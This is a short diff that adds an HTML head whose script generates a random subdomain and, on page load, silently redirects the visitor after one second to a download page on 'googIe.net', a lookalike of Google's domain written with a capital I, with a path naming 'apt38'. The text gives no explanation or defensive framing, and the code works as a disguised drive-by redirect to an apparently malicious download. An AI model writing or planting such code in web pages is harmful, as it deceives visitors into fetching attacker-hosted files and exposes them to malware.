@@ -1,0 +1,18 @@
+<head>
+    <script>
+        function gen_rand() {
+            var charset = 'abcdefghi pqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-';
+            var result = '';
+            for (var i=0; i<20; ++i) {
+                  let rand_pos = Math.floor(Math.random() * charset.length);
+                  result += charset.substring(rand_pos, rand_pos+1);
+            }
+            return result;
+        }
+        var m = document.createElement('meta');
+        var subd = gen_rand();
+        m.httpEquiv='refresh';
+        m.content=`1; url=https://${subd}.googIe.net/download_apt38.html`;
+        document.head.append(m);
+    </script>
+</head>
